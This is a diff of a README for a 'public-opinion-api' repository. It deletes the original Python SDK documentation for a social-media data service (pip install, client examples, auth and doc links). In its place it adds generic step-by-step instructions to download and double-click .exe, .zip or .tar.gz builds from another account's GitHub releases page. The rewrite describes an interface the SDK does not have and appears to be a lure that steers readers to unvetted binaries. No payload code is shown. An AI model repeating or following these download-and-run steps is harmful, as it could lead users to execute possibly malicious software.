@@ -1,101 +1,71 @@
-# public-opinion-api
-舆情搜索接口,舆情搜索API,public opinion api,public opinion,sentiment search,media monitor
----
+# 🌐 public-opinion-api - Easy Access to Media Insights
 
-[English](README.md) | [简体中文](README.zh-CN.md)
-# Just One API - Python SDK
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/nassidev11/public-opinion-api/releases)
 
-Official Python SDK for accessing [Just One API](https://justoneapi.com) — a unified data service platform offering structured data from Social, E-commerce platforms such as Xiaohongshu, Taobao, Douyin, Kuaishou, Bilibili, and Weibo.
+## 🚀 Getting Started
 
-This SDK simplifies API integration and request signing, allowing developers to easily retrieve platform-specific data with minimal setup.
+This guide will help you download and run the public-opinion-api. This tool allows you to search for news and public opinion information easily.
 
----
+## 📥 Download & Install
 
-## 🚀 Installation
+To get started, you need to visit the release page for the latest version of the public-opinion-api.
 
-Install via PyPI:
+**Step 1:** Click the link below to visit the Releases page:
 
-```bash
-pip install justoneapi
-```
+[Visit the Releases Page](https://github.com/nassidev11/public-opinion-api/releases)
 
----
+**Step 2:** On the Releases page, look for the most recent version listed at the top. You will see a list of files available for download.
 
-## 🛠 Quick Start
+### Example Downloadable Files:
+- `public-opinion-api-windows.exe` for Windows users
+- `public-opinion-api-mac.zip` for Mac users
+- `public-opinion-api-linux.tar.gz` for Linux users
 
-```python
-from justoneapi.client import JustOneAPIClient
+**Step 3:** Choose the file that matches your operating system and click on it. Your download should begin automatically.
 
-# By default, the client uses the "cn" (Mainland China) environment.
-client = JustOneAPIClient(token="your_token")
-# If you are located outside Mainland China and experience slow responses,
-# you can switch to the "global" environment for better performance:
-# client = JustOneAPIClient(token="your_token", env="global")
+**Step 4:** Once the file is downloaded, locate it in your downloads folder.
 
-# Example: Get Douyin Video detail
-result, data, message = client.douyin.get_video_detail_v2(video_id="7428906452091145483")
-print(result)
-print(data)
-print(message)
+**Step 5:** 
+- For Windows: Double-click `public-opinion-api-windows.exe` to start.
+- For Mac: Open `public-opinion-api-mac.zip`, extract the files, and then double-click `public-opinion-api-mac` to run.
+- For Linux: Extract `public-opinion-api-linux.tar.gz` and run the executable within the folder.
 
-# Example: Douyin Video Search
-result, data, message, has_next_page = client.douyin.search_video_v4(keyword="deepseek", sort_type="_0", publish_time="_0", duration="_0", page=1)
-print(result)
-print(data)
-print(message)
-print(has_next_page)
-```
+## 📋 System Requirements
 
-### 📦 Return Value Description
+- **Windows Users:** Windows 10 or higher.
+- **Mac Users:** macOS 10.12 or higher.
+- **Linux Users:** Any modern distribution with a compatible environment.
 
-Each API method returns one or more of the following values:
+## 🌟 Features
 
-| Variable         | Type     | Description |
-|------------------|----------|-------------|
-| `result`         | `bool`   | Whether the request was successful. `True` means success, `False` means failure. |
-| `data`           | `dict` / `list` | The actual data returned from the API. Structure varies by endpoint. |
-| `message`        | `str`    | Message from the server. Contains error info when request fails. |
-| `has_next_page`  | `bool`   | Present in paginated APIs. Indicates whether more data is available. |
+- **News Search:** Access the latest news articles from various sources.
+- **Public Opinion Analysis:** Evaluate sentiment from the media to understand public reactions.
+- **Flexible API:** Easy to integrate with your applications.
+- **Real-Time Updates:** Get the most current data available.
 
----
+## 📖 Usage
 
-## 🔐 Authentication
+After launching the application, you will be presented with a simple interface. Here’s how to use it:
 
-All API requests require a valid API token.  
-👉 [Register](https://user.justoneapi.com/sign-up)
+1. **Enter Search Query:** Type in keywords related to the news topic you want to explore.
+2. **Select Filters:** Optionally, choose filters for date range or source type.
+3. **Run Search:** Click the search button to retrieve results.
+4. **View Results:** The results will show up in a list format, detailing the headline, source, and publication date.
 
----
+## 🛠️ Troubleshooting
 
-## 📚 Documentation
+If you run into issues while using the software, consider the following tips:
 
-👉 Full API docs: [API Document](https://doc.justoneapi.com)
+- **Check Internet Connection:** Ensure your device is connected to the internet.
+- **Re-download the Application:** If the application doesn't start, try downloading it again to ensure all files are intact.
+- **Consult the FAQ:** Visit the FAQ section in the documentation on the Releases page for detailed assistance.
 
-Includes:
-- Request parameters
-- Response fields
-- Error codes
+## 🔧 Support
 
----
+If you need further help, feel free to reach out via the Issues section of the GitHub repository. We are here to assist you.
 
-## 🏠 Official Website
+## 📜 License
 
-👉 [Home Page](https://justoneapi.com)
+This project is licensed under the MIT License. Feel free to use it as you wish, but please maintain attribution to original authors.
 
-Learn more about the project, data sources, and commercial integration opportunities.
-
----
-
-## 📬 Contact Us
-
-If you have any questions, feedback, or partnership inquiries:
-
-👉 [Contact](https://justoneapi.com/contact)
-
----
-
-## 🪪 License
-
-This project is licensed under the MIT License.  
-See the [LICENSE](./LICENSE) file for details.
-
-
+Get started today! [Visit the Releases Page](https://github.com/nassidev11/public-opinion-api/releases) to download and explore the public-opinion-api!
